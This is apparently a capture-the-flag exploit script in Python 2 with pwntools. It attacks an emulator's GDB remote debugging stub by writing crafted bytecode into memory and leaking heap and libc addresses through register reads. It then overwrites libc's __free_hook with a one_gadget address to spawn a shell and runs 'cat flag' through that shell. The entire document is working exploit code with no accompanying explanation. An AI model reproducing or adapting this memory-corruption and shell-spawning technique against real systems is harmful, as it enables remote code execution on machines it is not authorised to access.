
from pwn import *
import struct

context.update(endian='little')
context.log_level = 'error'

def packet(data):
    checksum = '{:02x}'.format(sum(ord(c) for c in data)&0xFF)
    return '$' + data + '#' + checksum + '+'

def rest(r):
    data = r.recvuntil('#')
    r.recv(2)
    return data

def consume(r):
    crap = r.recvuntil('+')
    if r.recv(1) != '$':
        r.interactive()
        raise Exception('wut')
    data = rest(r)
    r.send('+')
    return data

def finalex(r,data):
    r.send(packet(data))

def ex(r,data):
    r.send(packet(data))
    return consume(r)

def regs(r):
    data = ex(r,'g').strip('#').decode('hex')
    print repr(data)
    return struct.unpack('<23I', data)

def cont(r):
    return ex(r,'c')

def writemem(r, d, l, hexdata):
    memdata = hexdata.encode('hex')
    print repr(memdata)
    data = ex(r, 'M{:x},{:x}'.format(d, l) + ":" + memdata)
    print repr(data)
    return data.strip('#')

def pregs(r):
    re = regs(r)
    print 'regs', ' '.join('{:08x}'.format(c) for c in re)
    return re

def setbreakpoint(r, addr, t = 0, leng = 1):
    data = ex(r,'Z{:x},{:x},{:x}'.format(t, addr, leng))
    print repr(data)
    return data.strip("#")

def delbreakpoint(r,addr, t = 0, leng = 1):
    data = ex(r,'z{:x},{:x},{:x}'.format(t, addr, leng))
    print repr(data)
    return data.strip("#")

def finalfree(r,addr, t = 0, leng = 1):
    finalex(r,'z{:x},{:x},{:x}'.format(t, addr, leng))


def exploit(ip,port):
    try:
        p = remote(ip, port)
        p.send('+')

        pregs(p)
        write_got = 0x603FA1


        pl1 = "\x43\x1f\x3e\x10\x00\x00"
        pl1 += "\x4b\x0f\x02\x00\x00\x00"
        pl1 += "\x4a\x0f\x00\x00\x00\x00"
        writemem(p,0x0,len(pl1), pl1)

        setbreakpoint(p,len(pl1), t=0, leng=1)
        setbreakpoint(p,100, t=0, leng=1)
        setbreakpoint(p,104, t=0, leng=1)
        delbreakpoint(p,100, t=0, leng=1)
        delbreakpoint(p,104, t=0, leng=1)
        cont(p)
        delbreakpoint(p,len(pl1), t=0, leng=1)

        res = regs(p)
        heap_leak = res[15]
        print "heap_leak:",hex(heap_leak)
        stack_mem = heap_leak - (0x1fdb0a0 - 0x1fda080)
        print "stack_mem:" ,hex(stack_mem)


        pl2 = "\x43\x1f" + p32(write_got + 0x100000000 - (stack_mem + 2*len(pl1)))
        pl2 += "\x4b\x0f\x02\x00\x00\x00"
        pl2 += "\x4a\x0f\x00\x00\x00\x00"
        writemem(p,len(pl1),len(pl1) + len(pl2), pl2)
        setbreakpoint(p,len(pl1) + len(pl2), t=0, leng=1)
        cont(p)
        delbreakpoint(p,len(pl1) + len(pl2), t=0, leng=1)
        libc_leak = regs(p)[15]
        print "libc_leak: ",hex(libc_leak)

        offset_write = 0x00000000000f72b0
        libc_base = int("0x7f" + hex(libc_leak)[2:] + "b0",16) - offset_write
        print "libc_base: ",hex(libc_base)
        offset___free_hook = 0x00000000003c67a8
        free_hook = libc_base + offset___free_hook
        one_gadget = libc_base + 0x4526a
        stack_bss = 0x604900
        free_hook_o = free_hook - 0x800 + 0x8

        pl3 = "\x43\x1f" + p32(stack_bss + 0x100000000 - (stack_mem + 3*len(pl1) + 6))
        pl3 += "\x4b\x0f\x08\x00\x00\x00"
        pl3 += "\x43\x1f" + p32(free_hook_o % 0x100000000)
        pl3 += "\x4b\x0f\x00\x00\x00\x00"
        pl3 += "\x43\x1f" + p32(stack_bss + 0x4 + 0x100000000 - (stack_mem + 4*len(pl1) + 12))
        pl3 += "\x4b\x0f\x08\x00\x00\x00"
        pl3 += "\x43\x1f" + p32(free_hook_o / 0x100000000)
        pl3 += "\x4b\x0f\x00\x00\x00\x00"

        writemem(p,len(pl1) + len(pl2),len(pl1) + len(pl2) + len(pl3), pl3)
        setbreakpoint(p,len(pl1) + len(pl2) + len(pl3), t=0, leng=1)
        cont(p)
        delbreakpoint(p,len(pl1) + len(pl2) + len(pl3), t=0, leng=1)

        pl4 = "\x4e" + p32(one_gadget / 0x100000000)
        pl4 += "\x4e" + p32(one_gadget % 0x100000000)
        writemem(p,len(pl1) + len(pl2) + len(pl3), len(pl1) + len(pl2) + len(pl3) + len(pl4), pl4)
        setbreakpoint(p,len(pl1) + len(pl2) + len(pl3) + len(pl4), t=0, leng=1)
        #attach()
        cont(p)
        finalfree(p,len(pl1) + len(pl2) + len(pl3) + len(pl4), t=0, leng=1)
        p.sendline()
        p.sendline(line="echo AAAAA && cat flag && echo BBBBB")
        p.recvuntil("AAAAA")
        flag = p.recvuntil("BBBBB", drop=True).strip()
        print "[%s] %s\n" % (ip, flag)
        p.close()
    except Exception as e:
        print e

exploit("127.0.0.1", 1234)